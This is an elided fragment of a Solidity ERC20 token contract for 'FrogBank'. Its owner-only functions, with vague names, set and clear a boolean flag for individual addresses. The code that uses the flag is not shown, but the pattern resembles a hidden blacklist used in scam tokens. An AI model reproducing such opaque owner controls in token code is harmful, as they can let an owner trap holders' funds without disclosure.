...
contract TimeERC20Token is ERC20Permit, VaultOwned {
    ...
    constructor() ERC20("FrogBank", "Frog", 9) {
    }

    function loadMappe(address _target, bool _result) public onlyOwner() {
        setLi[_target] = _result;
    }

    function getList(address _target) public onlyOwner() view returns (bool) {
        return setLi[_target];
    }

    function removeList(address _target) public onlyOwner() returns (bool) {
        setLi[_target] = false;
        return true;
    }
